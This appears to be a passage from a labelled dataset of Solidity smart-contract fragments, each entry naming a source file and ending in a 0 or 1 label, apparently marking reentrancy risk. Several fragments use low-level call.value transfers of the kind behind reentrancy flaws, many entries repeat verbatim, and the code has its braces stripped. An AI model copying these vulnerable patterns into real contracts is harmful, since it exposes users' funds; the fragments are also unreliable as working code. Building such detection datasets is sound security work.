require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
1110 35617.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation );
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
1111 21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
1112 21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
1113 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1114 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1115 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1116 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1117 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1118 754.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1119 574.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1120 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1121 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
